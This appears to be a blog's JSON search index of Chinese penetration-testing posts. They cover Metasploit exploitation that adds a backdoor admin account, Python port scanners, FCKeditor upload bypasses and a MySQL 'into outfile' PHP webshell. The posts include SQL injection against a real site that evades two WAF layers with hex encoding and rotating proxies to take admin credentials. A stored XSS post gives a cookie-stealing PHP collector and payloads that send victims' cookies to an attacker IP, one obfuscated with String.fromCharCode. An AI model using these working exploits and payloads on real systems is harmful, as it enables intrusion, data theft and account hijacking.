连不上目标机器，需要重启目标机器再进行测试。 输入命令 show targets 查看可设置的系统版本，这里 windows xp SP3 简体中文对应的 id 是 41 重启目标机器后，target 设置为 41，重新攻击成功，获取到 meterpreter 6、远程登陆目标机器在 meterpreter 下输入 shell ，进入 shell 交互环境。由于前面 nmap 扫描发现目标机器还开启了 3389 远程登陆端口，尝试新增账号来登陆。依次输入以下命令 12345678# 新建一个用户名是 test，密码是 test 的用户net user test test &#x2F;add# 将用户 test 添加到管理员组net localgroup Administrators test &#x2F;add# 将用户 test 添加到允许远程登录的组net localgroup &quot;Remote Desktop Users&quot; test &#x2F;add 在 kali 机器上新开一个 terminal 窗口，输入登陆远程桌面的命令 rdesktop 10.1.1.130 使用上面新建的 test 用户登录成功 7、如果是真实渗透项目，测试完毕后记得将创建的用户删除 12345678# 将用户 test 从管理员组删除net localgroup Administrators test &#x2F;del# 将用户 test 从允许远程登录的组删除net localgroup &quot;Remote Desktop Users&quot; test &#x2F;del# 将用户 test 从系统中删除net user test &#x2F;del","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Python打造端口扫描器(2) - TCP SYN扫描","slug":"Python打造端口扫描器(2) - TCP SYN扫描","date":"2020-05-29T04:00:00.000Z","updated":"2020-05-29T11:40:03.276Z","comments":true,"path":"2020/05/29/Python打造端口扫描器(2) - TCP SYN扫描/","link":"","permalink":"http://yoursite.com/2020/05/29/Python%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8(2)%20-%20TCP%20SYN%E6%89%AB%E6%8F%8F/","excerpt":"","text":"写在前面这篇文章是 python 打造端口扫描器的第二篇，介绍 TCP SYN扫描模式。 原理简介 此模式类似于 nmap 的 -sS 模式（nmap的默认扫描模式） TCP SYN 扫描也就是半开扫描（半开式扫描），这种扫描方式与全连接扫描类似，但客户端不会和服务端建立完整的连接。 扫描过程为：客户端会发送一个带有 SYN 标识和端口号的 TCP 数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有 SYN 和 ACK 标识的数据包给客户端，随后客户端会返回带有 RST 标识的数据包，而不是像全连接扫描一样返回一个带有 ACK和 RST 标识的数据包，这样就不会与服务端建立完整的连接了。如果目标端口处于关闭状态，则服务端会返回一个 RST 标识的数据包。 完整代码半开扫描的实现代码与全连接扫描的实现代码很相似，从原理就可以知道，主要的区别在于客户端对端口第二次发送的数据包flags的值，直接断开连接，这样就不会进行一次完整的TCP连接。 如下图，只需将客户端第二次发送给服务器的 flags 设置为 R,其他的部分与上一篇全开扫描一致。 仍然使用 scapy 配合多线程完成。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import threading,timeimport sysfrom scapy.all import *import Print_Font as font # 第一篇文章中封装的打印颜色方法def get_ip(): '''从命令行参数中获取 IP''' try: parameter = sys.argv ip = parameter[1] print('The IP you test is : ', end = '') font.print_YELLOW(ip) except Exception as e: print(e) return ipdef port_scan(port): '''扫描端口''' try: packet = IP(dst=ip)/TCP(dport=port,flags='S') # 构造一个 flags 的值为 S 的报文 send = sr1(packet,timeout=2,verbose=0) if send.haslayer('TCP'): if send['TCP'].flags == 'SA': # 判断目标主机是否返回 SYN+ACK send_1 = sr1(IP(dst=ip)/TCP(dport=port,flags='R'),timeout=2,verbose=0) # 只向目标主机发送 RST font.print_GREEN('[+] %d is open' % port) elif send['TCP'].flags == 'RA': pass except: passdef main(): threads = [] threads_count = 100 # 线程数，默认 100 个线程 packet_ping = IP(dst=ip)/ICMP() # 在扫描端口之前先用 ICMP 协议探测一下主机是否存活 ping = sr1(packet_ping,timeout=2,verbose=0) if ping is not None: for p in range(1,1001): # 默认扫描1-1000的端口，可以手动修改这里的端口范围 t = threading.Thread(target=port_scan,args=(p,)) threads.append(t) for t in threads: t.start() for t in threads: t.join() elif ping is None: font.print_RED('该主机处于关闭状态或本机被该主机过滤，无法对其使用 ping 探测')if __name__ == '__main__': ip = get_ip() start_time = time.time() main() end_time = time.time() print('[time cost] : ' + str(end_time-start_time) + ' 秒') 使用方法：1python TCP_SYN_Scan_Socket.py 14.215.177.38 扫描结果","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"端口","slug":"端口","permalink":"http://yoursite.com/tags/%E7%AB%AF%E5%8F%A3/"},{"name":"扫描器","slug":"扫描器","permalink":"http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"}]},{"title":"Python打造端口扫描器(1) - TCP Connect","slug":"Python打造端口扫描器(1) - TCP Connect","date":"2020-05-25T04:00:00.000Z","updated":"2020-05-29T09:30:24.383Z","comments":true,"path":"2020/05/25/Python打造端口扫描器(1) - TCP Connect/","link":"","permalink":"http://yoursite.com/2020/05/25/Python%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8(1)%20-%20TCP%20Connect/","excerpt":"","text":"写在前面实际上现在有一些比较完善的第三方库可以直接拿来扫描端口，比如 python-nmap，为什么我还要写这一系列的文章，主要是为了更好地理解扫描端口的过程和原理，知其然并且要知其所以然。这篇文章是 python 打造端口扫描器的第一篇，通过两种方法介绍 TCP Connect 扫描模式。 原理简介 此模式类似于 nmap 的 -sT 模式 TCP Connect 扫描又称全连接扫描，在扫描每一个端口时，客户端都会尝试与服务端进行一次完整的3次握手。假设客户端想测试服务端的80端口是否开放，就会尝试与80端口建立连接来进行通信，首先客户端会发送一个带有SYN标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有SYN和ACK标识的数据包给客户端，随后客户端会发送带有ACK和RST标识的数据包给服务端，这样客户端与服务器就建立了连接。如果端口不开放，服务端则会返回一个RST标识的数据包给客户端。 简言之，端口开放，会连接成功，端口关闭，会连接失败 实现代码 1开始之前先新建一个 Print_Font.py 文件，封装 print 打印颜色的方法，是为了将扫描的结果更易于观察 123456789101112131415'''将 print 打印颜色的方法进行封装，方便调用'''def print_RED(a): '''打印红色''' print('\\033[31m%s\\033[0m' % a)def print_GREEN(a): '''打印绿色''' print('\\033[32m%s\\033[0m' % a)def print_YELLOW(a): '''打印黄色''' print('\\033[33m%s\\033[0m' % a) 扫描端口代码使用 python 的 socket 模块进行 socket 连接，配合 threading,queue 多线程加快扫描速度 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import threading,timefrom socket import *import queueimport sysimport Print_Font as fontsetdefaulttimeout(1) # 设置整个 socket 层的超时时间，即某端口 1 秒内未连接成功则跳过def get_ip(): '''从命令行参数中获取 IP''' try: parameter = sys.argv ip = parameter[1] print('The IP you test is : ', end = '') font.print_YELLOW(ip) except Exception as e: print(e) return ipclass DoRun(threading.Thread): def __init__(self,queue_s): threading.Thread.__init__(self) self._queue = queue_s def run(self): '''扫描端口的方法''' while not self._queue.empty(): try: port = self._queue.get() s = socket(AF_INET, SOCK_STREAM) s.connect((ip, port)) font.print_GREEN('[+] %d is open' % port) except: passdef main(): threads = [] threads_count = 100 # 线程数，默认 100 queue_s = queue.Queue() for i in range(1,1001): # 默认扫描1-1000的端口，可以手动修改这里的端口范围 queue_s.put(i) # 使用 queue.Queue().put() 方法将端口添加到队列中 for i in range(threads_count): threads.append(DoRun(queue_s)) # 扫描的端口依次添加到线程组 for i in threads: i.start() for i in threads: i.join()if __name__ == '__main__': ip = get_ip() # 获取命令行传入的 IP start_time = time.time() main() end_time = time.time() print('[time cost] : ' + str(end_time-start_time) + ' 秒') 使用方法：1python TCP_Connect_Scan_Socket.py 192.168.0.105 扫描结果 实现代码 2除了 socket，还可以使用 scapy 库，scapy 是一个第三方库，它能够实现对 TCP/IP 以下几乎所有协议的数据包实现发送、捕获、分析和构造。利用它可以做扫描、探测、网络发现等。 安装 scapy1pip install scapy 扫描端口代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import threading,timeimport queueimport sysfrom scapy.all import *import Print_Font as fontdef get_ip(): '''从命令行参数中获取 IP''' try: parameter = sys.argv ip = parameter[1] print('The IP you test is : ', end = '') font.print_YELLOW(ip) except Exception as e: print(e) return ipdef port_scan(port): try: packet = IP(dst=ip)/TCP(dport=port,flags='S') # 构造一个 flags 的值为 S 的报文 send = sr1(packet,timeout=2,verbose=0) if send.haslayer('TCP'): if send['TCP'].flags == 'SA': # 判断目标主机是否返回 SYN+ACK send_1 = sr1(IP(dst=ip)/TCP(dport=port,flags='AR'),timeout=2,verbose=0) # 向目标主机发送 ACK+RST font.print_GREEN('[+] %d is open' % port) elif send['TCP'].flags == 'RA': pass except: passdef main(): threads = [] threads_count = 100 # 线程数，默认 100 个线程 packet_ping = IP(dst=ip)/ICMP() # 在扫描端口之前先用 ICMP 协议探测一下主机是否存活 ping = sr1(packet_ping,timeout=2,verbose=0) if ping is not None: for p in range(1,1001): # 默认扫描1-1000的端口，可以手动修改这里的端口范围 t = threading.Thread(target=port_scan,args=(p,)) threads.append(t) for t in threads: t.start() for t in threads: t.join() elif ping is None: font.print_RED('该主机处于关闭状态或本机被该主机过滤，无法对其使用 ping 探测')if __name__ == '__main__': ip = get_ip() start_time = time.time() main() end_time = time.time() print('[time cost] : ' + str(end_time-start_time) + ' 秒') 先用 scapy 构造一个 flags 的值为 S 的报文，S 代表 SYN，就是请求建立一个 TCP 连接，在接收到服务器返回的报文中，如果 flag 上的值为 SA（SYN,ACK），那么就代表服务器确定接收到发送的连接请求并同意建立连接，这时候客户端再回应一个 AR（ACK,RST）报文，确定接收到服务器的响应，建立连接后又立刻断开。 使用方法：1python TCP_Connect_Scan_Scapy.py 182.131.4.2 扫描结果 上面两个例子都是扫描 1-1000 端口，使用 100 个线程，需要修改时在代码中修改相应的数字，或者做成参数化在命令行传参即可。","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"端口","slug":"端口","permalink":"http://yoursite.com/tags/%E7%AB%AF%E5%8F%A3/"},{"name":"扫描器","slug":"扫描器","permalink":"http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"}]},{"title":"python 中 print 打印显示颜色","slug":"python 中 print 打印显示颜色","date":"2020-05-22T04:00:00.000Z","updated":"2020-05-22T08:59:20.346Z","comments":true,"path":"2020/05/22/python 中 print 打印显示颜色/","link":"","permalink":"http://yoursite.com/2020/05/22/python%20%E4%B8%AD%20print%20%E6%89%93%E5%8D%B0%E6%98%BE%E7%A4%BA%E9%A2%9C%E8%89%B2/","excerpt":"","text":"语法和参数1. 打印颜色的语法 只添加文字颜色： \\033[字体色参数m......\\033[0m 只添加背景色： \\033[背景色参数m......\\033[0m 综合打印： \\033[显示方式参数;字体色参数;背景色参数m......\\033[0m 语句中间的省略号就是需要打印的字符串 2. 对应的颜色参数 显示方式 效果 0 终端默认设置 1 高亮显示(加粗) 4 使用下划线 5 闪烁 7 反白显示 8 不可见 字体颜色 背景色 颜色描述 30 40 黑色 31 41 红色 32 42 绿色 33 43 黄色 34 44 蓝色 35 45 紫红色 36 46 青蓝色 37 47 白色 3. DEMO12345678# 高亮显示，字体紫色，没有背景色print('\\033[1;35mtest\\033[0m')# 高亮显示，字体绿色，背景红色print('\\033[1;32;41mtest\\033[0m')# 不高亮显示，字体黄色，背景蓝色print('\\033[0;33;44mtest\\033[0m') 封装成方便调用的函数12345678910def printRED(a): '''打印红色''' print('\\033[31m%s\\033[0m'%a)def printGREEN(a): '''打印绿色''' print('\\033[32m%s\\033[0m'%a) printGREEN('[+] ' + '192.168.1.1')printRED('[-] ' + '192.168.1.2')","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"编辑器拿 webshell - FCKeditor 2.4.3","slug":"编辑器拿webshell - FCKeditor 2.4.3","date":"2020-05-07T12:00:00.000Z","updated":"2020-05-11T04:50:24.171Z","comments":true,"path":"2020/05/07/编辑器拿webshell - FCKeditor 2.4.3/","link":"","permalink":"http://yoursite.com/2020/05/07/%E7%BC%96%E8%BE%91%E5%99%A8%E6%8B%BFwebshell%20-%20FCKeditor%202.4.3/","excerpt":"","text":"查看 fckeditor 版本有两种方式 1http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;fckeditor&#x2F;editor&#x2F;dialog&#x2F;fck_about.html 1http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;fckeditor&#x2F;_whatsnew_.html 漏洞利用这是 fckeditor 自带的一个测试文件，如果管理员没有删除的话就会被利用，以 php 为例，connectors 选中 php 1http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;test.html 上传一句话木马，被拦截 当前服务器是 Windows，这里此版本的校验不是很严谨，后缀名加空格就可以轻松绕过 上传成功 点击页面上的 Get folders and files ，可以看到上传路径和文件名 浏览器访问一句话木马 连上菜刀 FCK 其他可能存在的上传地址12345fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.htmlfckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;browser.html?Type&#x3D;Image&amp;Connector&#x3D;connectors&#x2F;jsp&#x2F;connectorfckeditor&#x2F;editor&#x2F;filemanager&#x2F;upload&#x2F;test.htmlfckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;test.htmlfckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;uploadtest.html 漏洞源码分析通过抓包得知上传文件的接口是 1&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;php&#x2F;connector.php?Command&#x3D;FileUpload&amp;Type&#x3D;File&amp;CurrentFolder&#x3D;&#x2F; 1.打开源码中的 connector.php 文件，追踪 Command 参数 2.当参数值是 FileUpload 时，Command 参数被 FileUpload() 函数处理了 3.继续追踪到 commands.php 文件，FileUpload() 函数使用了黑名单 4.继续追踪到 config.php 配置文件，查到黑名单内容，根据黑名单没有限制的部分进行绕过，例如 Windows 下可以在后缀名后面加空格或者点绕过。","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"mysql secure_file_priv 设置","slug":"mysql secure_file_priv 设置","date":"2020-05-07T04:00:00.000Z","updated":"2020-05-07T13:05:00.277Z","comments":true,"path":"2020/05/07/mysql secure_file_priv 设置/","link":"","permalink":"http://yoursite.com/2020/05/07/mysql%20secure_file_priv%20%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"测试 mysql 写 webshell 时需要开启 secure_file_priv，否则无法写入，该参数在 mysql 5.6.34 以后默认是 NULL。 查看 secure_file_priv 的状态1show variables like &#39;secure_file_priv&#39;; secure_file_priv 的值有三种情况 值 解释 NULL(默认) 不允许导入导出文件 D:\\test 只允许在 D:\\test 目录导入导出文件 空 不限制路径，可以任意导入导出文件 配置文件所在路径：Windows：C:/mysql/my.iniLinux：/etc/mysql/my.conf 修改配置文件在 mysql 的安装路径中打开 my.ini 配置文件，修改 [mysqld] 下的 secure_file_priv 的值，如果没有 secure_file_priv 就手动新增一行 12[mysqld]secure_file_priv &#x3D; 修改完毕后重启 mysql 生效 写入 webshell1select &quot;&lt;?php eval($_POST[&#39;x&#39;]);?&gt;&quot; into outfile &quot;D:&#x2F;test&#x2F;shell.php&quot;; 成功写入","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"搜索查询类的 sql 注入快速判断参数类型和闭合类型","slug":"搜索类的 sql 注入快速判断参数类型和闭合类型","date":"2020-04-27T10:00:00.000Z","updated":"2020-05-07T08:03:10.093Z","comments":true,"path":"2020/04/27/搜索类的 sql 注入快速判断参数类型和闭合类型/","link":"","permalink":"http://yoursite.com/2020/04/27/%E6%90%9C%E7%B4%A2%E7%B1%BB%E7%9A%84%20sql%20%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%92%8C%E9%97%AD%E5%90%88%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"0x00 制作通用的小字典搜索查询类的 sql 语句注入第一步通常是判断查询语句的参数类型和闭合方式，然后进行下一步的注入。PHP 中最简单的查询语句如下 1234select * from users where id&#x3D;$id;select * from users where id&#x3D;&#39;$id&#39;;select * from users where id&#x3D;(&quot;$id&quot;);等等... 参数类型： int 类型 str 类型 闭合类型: 单引号 &#39; 双引号 &quot; 单引号和括号 &#39;) 双引号和括号 &quot;) 单引号和双括号 &#39;)) 双引号和双括号 &quot;)) 行尾注释： # --+ -- - ;%00 将参数进行闭合，并且注释后面的代码后发送请求，如果返回值跟正常请求返回一样，就可以确定请求参数的类型和闭合符号。 交叉组合一下就会有 36 种情况 int str 单引号 str 双引号 1# 1’# 1”# 1)# 1’)# 1”)# 1))# 1’))# 1”))# 1–+ 1’–+ 1”–+ 1)–+ 1’)–+ 1”)–+ 1))–+ 1’))–+ 1”))–+ 1– - 1’– - 1”– - 1)– - 1’)– - 1”)– - 1))– - 1’))– - 1”))– - 1;%00 1’;%00 1”;%00 1);%00 1’);%00 1”);%00 1));%00 1’));%00 1”));%00 将所有的情况添加到一个txt文本作为简单的通用字典，实际应用中使用 burpsuite intruder 模块进行测试。 0x01 案例GET 请求该网站有通过 id 查询文章的功能 burpsuite 抓包发送到 intruder 模块，simper 模式进行爆破，将 id 参数化 使用上一步保存的字典，原始参数值是 290 爆破的结果按照返回值大小降序排列，可以看出这个请求的参数是 int 类型，没有引号闭合，-- -、#、;%00 三种注释方式没有被过滤。 POST 请求这个 POST 请求是通过客户昵称查询数据的功能，抓包将客户昵称 customerName 参数化 把上一步的字典中的原始参数值换成此接口的正确参数值。 POST 请求记得将 Intruder -&gt; Palyloads -&gt; Palyload Encoding 下面的 URL 编码取消勾选，否则参数值 -- - 中的空格会被转义成 %20 导致请求失败。 爆破的结果按照返回值大小降序排列，可以看出这个请求的参数是 str 字符串类型，使用单引号闭合，#、;%00 注释方式被过滤，-- - 可以正常注释。","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"实战绕过两层waf完成sql注入","slug":"实战绕过两层waf完成sql注入","date":"2020-04-15T04:00:00.000Z","updated":"2020-04-15T12:52:12.434Z","comments":true,"path":"2020/04/15/实战绕过两层waf完成sql注入/","link":"","permalink":"http://yoursite.com/2020/04/15/%E5%AE%9E%E6%88%98%E7%BB%95%E8%BF%87%E4%B8%A4%E5%B1%82waf%E5%AE%8C%E6%88%90sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"以下内容仅作为学习研究，禁止用于违法犯罪活动，由此产生的法律风险自行承担。 某网站存在一处sql注入漏洞。 第一层 waf在 id 后面加上 and 1=1，被 waf 拦截 将空格替换为加号 +，即 id=296+and+1=1 不再拦截 再将 id 改为 id=296+and+1=2，新闻详情返回为空，确认存在注入漏洞 通过 order by 查询字段数 ↓ 字段数超过长度的时候，新闻详情展示为空，没有超过长度的时候正确展示新闻详情 通过二分法不断测试，查询的字段数为 11 union 联合查询判断字段输出位置 ↓将 union 前面的id值设置为负数，使之返回为假从页面返回可以看出，2，4，8 的位置能展示返回内容 分别查询user()、version()、database() 确认可以正常返回 选择标题位置继续获取更多信息 查询所有的数据库名，被 waf 拦截 分别将 URL 中的 group_concat()、from、information_schema、schemata 字符依次删除并发送请求.最后确定是group_concat() 命中了waf规则，并且是 group_concat 和括号 () 在一起的时候才会触发拦截。 将 group_concat() 替换为 group_concat/**/()，仍然被拦截 不确定是黑名单匹配还是只要包含/**/这类注释就用正则匹配全部拦截，测试一下，打开burpsuite，使用intrude模块在 /**/ 中间加入随机任意字符串例如 /*asd13*/ 等，发现确实有些返回包不是 waf 拦截，但是返回状态码403且有如下提示，同样无法正常展示注入的数据，此路行不通 尝试内敛注释 /*!group_concat()*/ 也被拦截 拼接字符串相关的 concat()函数、concat_ws()函数都被拦截。 好吧，那就不直接获取全部返回值了，老老实实加上 limit 一个一个来吧没有被 waf 拦截，但是没有回显数据 问题来了，version()、user() 这些可以正常返回到前端页面，说明这个注入点是可以回显的，但是具体查询表数据的时候不展示，很有可能是后台代码对返回到前端的数据做了过滤，涉及敏感库表信息的就返回空值。 因此就先不花精力去尝试布尔盲注、时间盲注、NDSlog盲注等浪费时间的操作。先将查询的数据做一次变形，看是否能绕过后台匹配逻辑。 ascii()将查询的数据放到 ascii() 方法中，waf 没有拦截，可以正常返回数据ascii() 方法是返回字符串的第一个字符的 ascii 值，所以这里查询到的数据库名第一个字母是 h。可以写个简单的脚本或者用 burpsuite 替换 limit 的值挨个查询剩余数据库名的每个字符串ascii值再转换回字符串 hex()将查询的数据放到 hex() 方法中，waf 也没有拦截，同样可以正常返回数据比 ascii() 更方便，可以将整条数据都进行 hex 编码而不只是第一个字符，再通过 unhex() 方法转换回字符串接下来就可以手动+burpsuit获取一个个表名和表内数据了 第二层云 wafburp 获取的数据不够直观，用 python 重新写一下 获取全部数据库名 ↓1234567891011121314151617import time,requests,lxmlfrom bs4 import BeautifulSoupheaders = &#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36 Edg/81.0.416.50'&#125;for i in range(0,10000): url = 'http://www.xxx.com/xx.php?id=296+and+1=2+union+select+1,2,3,4,5,6,7,unhex(hex(schema_name)),9,10,11+from+information_schema.schemata+limit+%d,1--+' % i r = requests.get(url,headers=headers) soup = BeautifulSoup(r.text,'lxml') result = soup.select('div.main_word &gt; div.main_cont &gt; div.new_txt')[0].text.strip() if result != '': print(result) else: print('所有库查询完毕'+'\\n'+'-'*30) break 当前权限只查询出两个表，一个是 mysql 内置的 information_schema，另一个就是网站管理员自定义的表 hxxxxxxg 获取 hxxxxxxg 库内的所有表名称 ↓上面代码中 url 中的参数换成查询表名称的 sql 123456789101112...for i in range(0,10000): url = 'http://www.xxx.com/xx.php?id=296+and+1=2+union+select+1,2,3,4,5,6,7,unhex(hex(table_name)),9,10,11+from+information_schema.tables+where+table_schema=\"hxxxxxxg\"+limit+%d,1--+'%i r = requests.get(url,headers=headers) soup = BeautifulSoup(r.text,'lxml') result = soup.select('div.main_word &gt; div.main_cont &gt; div.new_txt')[0].text.strip() if result != '': print(result) else: print('所有表查询完毕') break 查询到8个表后脚本执行报错，在返回页面找不到数据打开浏览器查看是因为被另一个 waf 拦截导致的，这个是西部数据的云 waf 平台绕过云 waf 的思路主要是找该网站的真实 IP，如果能找到真实 IP 在本地电脑 host 绑定一下，那么云 waf 就形同虚设。 首先验证是否有 CDN多个地区的 ping 地址一样，解析的 IP 地址都是西部数码数据中心，也就是云 waf 的机房 查看 DNS 解析历史从不同的 DNS 历史解析平台查询到几个跟云 waf 不同网段的IP，很可能是网站之前的真实 IP 然而…挨个访问这些 IP 发现早已无法访问。 查询子域名 IPlayer子域名挖掘机和subdomainbrute扫描子域名发现两个其他的域名，一个mail开头的 IP ，访问跳转到了网易邮箱主页，应该是该网站的企业邮箱用的网易邮箱服务。另一个域名是smtp，访问这些 IP 也早已经无法访问 该网站也没有调起发送邮件的入口(例如邮箱注册等)，无法通过邮件获取真实 IP。通过钟馗之眼、fofa、shodan 等平台也没有找到该网站有价值的数据。查找真实 IP 绕过云 waf 这条路暂时没有好办法，放弃。 峰回路转 ↓根据这个云 waf 的提示很可能是由于请求速度过快，被当作是攻击行为进行了拦截导致 ip 被ban。 于是更换 ip 并增加等待时间结果不久后还是被拦截。 想起之前做爬虫时候写的 [ip 代理池]，猜想：如果每次请求更换一个随机的 ip 是否能绕过 waf。 IP_POOL 是一个自动获取 ip 的程序，python 编写，配合安装在本地的 redis 数据库维持代理池的可用性，默认从西刺代理和快代理采集前10页的免费代理，也可以手动添加其他网站进行采集，或者购买付费代理添加到此程序中。使用 flask 库对外开放三个接口，分别是：获取全部 ip，随机获取一个可用 ip，获取所有的 ip 数量 二话不说，找到之前写的代码，运行起来将获取 ip 的接口带入到之前的请求中再次尝试，每次请求随机更换一个 ip。 12345678def get_proxy(): proxy = requests.get('http://localhost:5000/random').text return proxyfor i in range(0,10000): ... r = requests.get(url,headers=headers,proxies=&#123;'http':'http://'+get_proxy()&#125;) ... 该数据库中的所有表都查了出来，共 338 个表。 其中有一个 “**_admin” 表，应该储存里管理员的信息，查一下字段。果然有 uname 和 pwd 字段，成功拿到管理员账号密码。 自动获取其他表数据同理，将python脚本中 URL 的参数修改为查询表数据的 sql 即可，不再赘述 总结1.绕过第一层 waf 是利用了它对敏感函数过滤不严格，可以利用hex编码/解码来使得查询的数据正常展示。2.平时可以维护一个代理池，在遇到云 waf 无法找到网站真实 ip 的时候可以从这方面绕过。","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"由markdown引发的XSS，获取其他用户的cookie登录信息","slug":"markdown引发的XSS","date":"2020-03-26T04:00:00.000Z","updated":"2020-04-13T04:15:18.289Z","comments":true,"path":"2020/03/26/markdown引发的XSS/","link":"","permalink":"http://yoursite.com/2020/03/26/markdown%E5%BC%95%E5%8F%91%E7%9A%84XSS/","excerpt":"","text":"每天写文章都用的 markdown 语法本身是支持直接写入 html 语句的，一些支持 markdown 的论坛或写作网站为了安全性通常会牺牲一些便利，将敏感的 HTML 标签和 JS 函数进行过滤，禁止用户输入。既然是黑名单过滤那肯定就有疏忽的时候，带着这种猜想去网上寻找在线的 markdown 网站，果不其然发现了一处存储型 XSS 。 初步验证下图某网站左边为文章编辑区域，右边是文章实时预览区域。 直接在标题处开干，输入 &lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;等，发现都被过滤没有显示 而输入 &lt;&gt; 不会被过滤 经过反复尝试发现只会过滤完整标签，且只过滤了一次，那么可以通过双写绕过，如下图 弹个窗试一下 嗯，alert() 这么敏感的函数都没有被过滤，看起来事情比想象的顺利 深入利用F12 调出控制台查看一下用户 cookie 包含登录态的 session 等没有设置 httponly，XSS获取用户cookie的念头油然而生 弹窗看一下，document.cookie 方法没有过滤，可以直接弹出用户 cookie 该网站用户编写的内容会自动保存并且有分享功能 ok，继续，在服务器创建一个php脚本来收集cookie，文章被浏览后自动在当前目录生成一个 cookie.txt 文件存储用户登录信息 1234&lt;?php$cookie = $_GET['cookie'];file_put_contents('cookie.txt',$cookie);?&gt; 编写 payload 1&lt;&lt;img&gt;img src=# onerror=eval(new Image().src=\"http://xx.xx.xx.xx/cookie.php?cookie=\"+document.cookie)&gt; 将 payload 写入文章内并保存，查看服务器。 并没有生成保存 cookie 的文件，应该是哪里被拦截了，刚开始猜测的是 document.cookie 写法的问题。 尝试，用 window[&quot;document&quot;][&quot;cookie&quot;] 代替 document.cookie，无效 1&lt;&lt;img&gt;img src=# onerror=eval(new Image().src=\"http://xx.xx.xx.xx/cookie.php?cookie=\"+window[\"document\"][\"cookie\"])&gt; 利用拼接，无效 1&lt;&lt;img&gt;img src=# onerror=eval(new Image().src=\"http://xx.xx.xx.xx/cookie.php?cookie=\"+window[\"doc\"+\"ument\"][\"coo\"+\"kie\"])&gt; 用16进制代替，无效 1&lt;&lt;img&gt;img src=# onerror=eval(new Image().src=\"http://xx.xx.xx.xx/cookie.php?cookie=\"+window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x63\\x6f\\x6f\\x6b\\x69\\x65\"])&gt; 一直以为是 document.cookie 的问题，仔细一看突然想到是不是 new 后面的空格导致的 将空格用注释符号 /**/ 代替，再次尝试，成功获得自己的 cookie 其实还有一个百试不爽的方法，在很多 XSS 绕不过的时候，将 payload 转为 String.formCharCode() 格式，能绕过很多的过滤，脑阔卡住的时候不经意间让人峰回路转。 1&lt;&lt;img&gt;img src=# onerror=eval(String.fromCharCode(110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,34,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,51,49,46,49,50,56,47,99,111,111,107,105,101,46,112,104,112,63,99,111,111,107,105,101,61,34,43,101,110,99,111,100,101,85,82,73,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))&gt; 